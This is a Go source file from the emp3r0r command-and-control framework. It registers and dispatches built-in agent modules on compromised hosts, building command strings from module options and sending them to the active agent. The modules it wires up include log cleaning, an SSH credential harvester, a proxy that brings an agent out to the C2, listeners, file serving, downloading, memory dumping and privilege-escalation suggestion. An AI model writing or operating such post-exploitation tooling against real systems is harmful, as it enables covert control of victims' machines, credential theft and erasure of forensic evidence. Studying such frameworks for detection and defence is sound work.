package modules

import (
	"fmt"
	"sort"
	"strconv"
	"strings"
	"sync"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

var (
	moduleRunnersMu          sync.RWMutex
	autoRegisterBuiltInsOnce sync.Once
)

type builtInGoModuleMeta struct {
	C2Cmd   string
	Special bool
}

var builtInGoModules = map[string]builtInGoModuleMeta{
	def.ModCLEAN_LOG:    {C2Cmd: def.C2CmdCleanLog},
	def.ModBring2CC:     {C2Cmd: def.C2CmdBring2CC},
	def.ModListener:     {C2Cmd: def.C2CmdListener},
	def.ModSSHHarvester: {C2Cmd: def.C2CmdSSHHarvester},
	def.ModFileServer:   {C2Cmd: def.C2CmdFileServer},
	def.ModDownloader:   {C2Cmd: def.C2CmdFileDownloader},
	def.ModLPE_SUGGEST:  {Special: true},
	def.ModMemDump:      {Special: true},
}

func ensureBuiltInGoModuleRunners() {
	autoRegisterBuiltInsOnce.Do(func() {
		def.Modules.Range(func(key, value any) bool {
			name := key.(string)
			meta, ok := builtInGoModules[name]
			if !ok || meta.Special {
				return true
			}
			if hasModuleRunner(name) {
				return true
			}

			mod := value.(*def.ModuleConfig)
			if strings.ToLower(mod.AgentConfig.Exec) != "built-in" || strings.ToLower(mod.AgentConfig.Type) != "go" {
				return true
			}
			if meta.C2Cmd == "" {
				return true
			}

			registerModuleRunner(name, makeAutoBuiltInRunner(name))
			return true
		})
	})
}

func makeAutoBuiltInRunner(modName string) func(ctx *c2context.C2Context) {
	return func(ctx *c2context.C2Context) {
		err := runAutoBuiltInModule(ctx, modName)
		if err != nil {
			logging.Errorf("%v", err)
		}
	}
}

func runAutoBuiltInModule(ctx *c2context.C2Context, modName string) error {
	if ctx.Target == nil {
		return fmt.Errorf("no active agent")
	}

	val, ok := def.Modules.Load(modName)
	if !ok {
		return fmt.Errorf("module %s config not found", modName)
	}
	mod := val.(*def.ModuleConfig)

	meta, ok := builtInGoModules[modName]
	if !ok {
		return fmt.Errorf("module %s has no metadata", modName)
	}
	if meta.Special {
		return fmt.Errorf("module %s is handled by a dedicated C2 runner", modName)
	}
	if meta.C2Cmd == "" {
		return fmt.Errorf("module %s has no mapped C2 command", modName)
	}

	flagVals := make(map[string]string, len(mod.Options))
	for name, opt := range mod.Options {
		if runtimeVal, ok := ctx.Flags[name]; ok {
			flagVals[name] = runtimeVal
			continue
		}
		if opt != nil {
			flagVals[name] = opt.Val
		}
	}

	keys := make([]string, 0, len(flagVals))
	for k := range flagVals {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	parts := []string{meta.C2Cmd}
	for _, key := range keys {
		val := strings.TrimSpace(flagVals[key])
		if val == "" {
			continue
		}

		// Legacy semantics: stop=yes should emit a standalone boolean flag.
		if key == "stop" && strings.EqualFold(val, "yes") {
			parts = append(parts, "--stop")
			continue
		}
		if key == "stop" && strings.EqualFold(val, "no") {
			continue
		}

		parts = append(parts, "--"+key, strconv.Quote(val))
	}

	cmd := strings.Join(parts, " ")
	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
		return fmt.Errorf("SendCmd: %w", err)
	}

	if modName == def.ModFileServer {
		logging.Infof("File server (port %s) is now %s", flagVals["port"], flagVals["switch"])
	}
	if modName == def.ModBring2CC {
		logging.Infof("agent %s is connecting to %s to proxy it out to C2", ctx.Target.Tag, flagVals["addr"])
	}
	if modName == def.ModListener {
		action := flagVals["action"]
		if action == "" {
			action = "start"
		}
		logging.Infof("Listener %s requested on %s", action, ctx.Target.Tag)
	}
	return nil
}

func registerModuleRunner(name string, runner func(ctx *c2context.C2Context)) {
	moduleRunnersMu.Lock()
	defer moduleRunnersMu.Unlock()
	ModuleRunners[name] = runner
}

func getModuleRunner(name string) func(ctx *c2context.C2Context) {
	moduleRunnersMu.RLock()
	defer moduleRunnersMu.RUnlock()
	return ModuleRunners[name]
}

func hasModuleRunner(name string) bool {
	moduleRunnersMu.RLock()
	defer moduleRunnersMu.RUnlock()
	_, ok := ModuleRunners[name]
	return ok
}
